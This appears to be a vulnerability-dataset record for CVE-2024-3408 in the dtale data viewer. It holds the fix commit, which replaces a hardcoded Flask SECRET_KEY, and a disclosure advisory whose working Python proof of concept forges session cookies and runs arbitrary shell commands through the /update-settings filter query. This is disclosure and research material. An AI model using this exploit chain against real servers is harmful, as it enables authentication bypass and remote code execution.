{
    "CVE-2024-3408": {
        "published_date": "2024-06-06T18:54:43.713Z",
        "patch_commits": [
            {
                "url": "https://github.com/man-group/dtale/commit/32bd6fb4a63de779ff1e51823a456865ea3cbd13",
                "content": "https://github.com/man-group/dtale/issues/870: update Flask's SECRET_KEY to be a random string\n\nFilename: dtale/app.py:\n```\n@@ -4,9 +4,11 @@\nimport jinja2\n import logging\n import os\n+import numpy as np\n import pandas as pd\n import random\n import socket\n+import string\n import sys\n import time\n import traceback\n\n@@ -292,6 +294,14 @@\ndef get_send_file_max_age(self, name):\n         return super(DtaleFlask, self).get_send_file_max_age(name)\n \n \n+def build_secret_key():\n+    \"\"\"\n+    Builds a string of 10 randomly chosen characters to be used as the Flask app's SECRET_KEY\n+    \"\"\"\n+\n+    return \"\".join(np.random.choice(list(string.ascii_uppercase + string.digits), 10))\n+\n+\n def build_app(\n     url=None, reaper_on=True, app_root=None, additional_templates=None, **kwargs\n ):\n\n@@ -320,7 +330,7 @@\ndef build_app(\n         instance_relative_config=False,\n         app_root=app_root,\n     )\n-    app.config[\"SECRET_KEY\"] = \"Dtale\"\n+    app.config[\"SECRET_KEY\"] = build_secret_key()\n \n     app.jinja_env.trim_blocks = True\n     app.jinja_env.lstrip_blocks = True\n```"
            }
        ],
        "sw_version": "v3.13.0",
        "sw_version_wget": "https://github.com/man-group/dtale/archive/refs/tags/v3.13.0.zip",
        "description": "man-group/dtale version 3.10.0 is vulnerable to an authentication bypass and remote code execution (RCE) due to improper input validation. The vulnerability arises from a hardcoded `SECRET_KEY` in the flask configuration, allowing attackers to forge a session cookie if authentication is enabled. Additionally, the application fails to properly restrict custom filter queries, enabling attackers to execute arbitrary code on the server by bypassing the restriction on the `/update-settings` endpoint, even when `enable_custom_filters` is not enabled. This vulnerability allows attackers to bypass authentication mechanisms and execute remote code on the server.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/57a06666-ff85-4577-af19-f3dfb7b02f91",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nAuthentication bypass and RCE in man-group/dtale\nValid\nReported on Feb 28th 2024\nDescription\nThis exploit chains two vulnerabilities to bypass authentication and then get RCE by abusing filter queries. Authentication bypass is due to hardcoded SECRET_KEY in flask config (https://github.com/man-group/dtale/blob/57faae453902eb8952134e98581c7ea6e060ee1d/dtale/app.py#L323). Knowing this key it is possible to forge a session cookie in case authentication was enabled in either ~/.config/dtale.ini or by setting global state directly in python:\nimport dtale\ndtale.global_state.set_auth_settings({'active': True, 'username': 'foo', 'password': 'bar'})\ndtale.show()\nTo achieve RCE, we abuse custom filter queries. By default filter queries are disabled: trying to set a filter will display an error message saying:\nCustom Filtering is currently disabled.  This feature is only for trusted environments, in order to unlock this feature you must do one of the following:\n\n- add \"enable_custom_filters=True\" to your dtale.show call\n- run this code before calling dtale.show\n    import dtale.global_state as global_state\n    global_state.set_app_settings(dict(enable_custom_filters=True))\n- add \"enable_custom_filters = True\" to the [app] section of your dtale.ini config file\nBut it is possible to bypass this restriction by setting a query directly using /update-settings endpoint (https://github.com/man-group/dtale/blob/57faae453902eb8952134e98581c7ea6e060ee1d/dtale/views.py#L1576) even if enable_custom_filters was not enabled. After this, calling any of the endpoints that view or manipulate the table will try to apply that query and execute arbitrary code\nProof of Concept\n$ pip install 'dtale==3.10.0'\n$ cat ~/.config/dtale.ini # optionally enable authentication\n[auth]\nactive = True\nusername = foo\npassword = bar\n$ dtale\n2024-02-28 13:10:04,454 - INFO     - D-Tale started at: http://localhost:40000\n\n# now in another terminal window:\n$ cat /tmp/touched_by_rce\ncat: /tmp/touched_by_rce: No such file or directory\n\n$ python poc.py --url='http://localhost:40000' --cmd='touch /tmp/touched_by_rce'\n{\"error\":\"Cannot mask...\n\n$ ls -la /tmp/touched_by_rce\n-rw-r--r-- 1 ao ao 0 Feb 28 13:11 /tmp/touched_by_rce\nimport json, hashlib\nfrom argparse import ArgumentParser\nfrom urllib.parse import quote\n\n# https://pypi.org/project/requests\nfrom requests import Session # pip install requests\n\n# https://pypi.org/project/itsdangerous/\nfrom itsdangerous import URLSafeTimedSerializer # pip install itsdangerous\n\nif __name__ == \"__main__\":\n    parser = ArgumentParser()\n    parser.add_argument(\"--url\", default=\"http://localhost:40000\")\n    parser.add_argument(\"--cmd\", default=\"touch /tmp/touched_by_rce\")\n    args = parser.parse_args()\n\n    url_base = args.url + \"/dtale\"\n    cmd = args.cmd\n\n    # forge a cookie in case there was authentication enabled:\n    signer_kwargs = { \"key_derivation\" : \"hmac\", \"digest_method\" : staticmethod(hashlib.sha1) }\n    ser = URLSafeTimedSerializer(\"Dtale\", salt=\"cookie-session\", signer_kwargs=signer_kwargs)\n    session = ser.dumps({\"logged_in\" : True, \"username\" : \"whatever\"})\n    print(f\"{session = }\")\n\n    with Session() as s:\n        s.cookies[\"session\"] = session\n\n        # create any pandas DataFrame:\n        rsp = s.post(f\"{url_base}/upload\", files={\n            \"poc.csv\" : (\"poc.csv\", b\"A,B\\n1,1\\n\", \"text/csv\")\n        })\n        assert rsp.json()[\"success\"]\n\n        # grab data_id:\n        data_id = rsp.json()[\"data_id\"]\n        print(f\"{data_id = }\")\n\n        # update settings for this data_id and set filter query directly bypassing\n        # any checks:\n        settings = {\"query\": f'@pd.core.frame.com.builtins.__import__(\"os\").system(\"\"\"{cmd} #\"\"\")'}\n        settings = quote(json.dumps(settings))\n        rsp = s.get(f\"{url_base}/update-settings/{data_id}?settings={settings}\")\n        assert rsp.json()[\"success\"]\n\n        # call any of the endpoints that trigger `run_query()`:\n        rsp = s.get(f\"{url_base}/edit-cell/{data_id}\")\n\n        # this will return some error as a response, but command was executed anyway\n        print(rsp.text)\nImpact\nThis vulnerability is capable of bypassing authentication (if it was enabled) and then get remote code execution on the server\nOccurrences\napp.py L323\nWe are processing your report and will contact theman-group/dtale team within 24 hours.a year ago\nWe have sent a magic link to the man-group/dtale team via the email provided in their security policya year ago\nWe have sent a follow up to the man-group/dtale team. We will try again in 4 days.a year ago\nWe have sent a second follow up to the man-group/dtale team. We will try again in 7 days.a year ago\nWe have sent a third follow up to the man-group/dtale team. We will try again in 14 days.a year ago\nWe have sent a fourth follow up to the man-group/dtale team. We will send a final notification 48 hours before report publication.a year ago\nDan McInerneymodified the Severity from Critical (10) to Critical (9.8)a year ago\nDan McInerney\ncommenteda year ago\nAdmin\nGreat report and excellent find. Replicated the RCE. This is actually 2 different reports as CVEs must be separated out individually. I'm going to treat this one as the RCE since it's higher sev. I recommend opening a separate report for the authentication bypass with a working PoC and we can validate that 9 days from now since maintainers have already been notified of it via this report.\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nDan McInerney validated this vulnerabilitya year ago\nozelishas been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-3408assigned to this report.a year ago\nDan McInerney gave praisea year ago\nExcellent PoC, great find.\nThe researcher's credibility has slightly increased as a result of the maintainer's thanks: +1\nWe have sent a warning to the man-group/dtale team to inform them that this report will be published in 48 hoursa year ago\nThis vulnerability has now been publisheda year ago\nCVE-2024-3408has now been publisheda year ago\nJoe Ammann\ncommenteda year ago\nCVE-2024-3408 is now fixed with the latest Dtale release 3.13.1. Please check the associated PR https://github.com/man-group/dtale/pull/871and issue https://github.com/man-group/dtale/issues/870.\nPlease adapt the version ranges for this CVE, thanks!\nSabrinamarked this as fixedin 3.13.1with commit32bd6f10 months ago\nThe fix bounty has been dropped\napp.py#L323 has been validated\nSign in to join this conversation\nCVE\nCVE-2024-3408\n(Published)\nVulnerability Type\nCWE-798: Use of Hard-coded Credentials\nSeverity\nCritical (9.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator\nRegistry\nPypi\nAffected Version\n3.10.0\nVisibility\nPublic\nStatus\nFixed\nFound by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\nÂ© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The advisory includes detailed proof of concept steps and scripts to replicate the described vulnerabilities."
            }
        ],
        "cwe": [
            {
                "id": "CWE-798",
                "value": "CWE-798 Use of Hard-coded Credentials"
            }
        ]
    }
}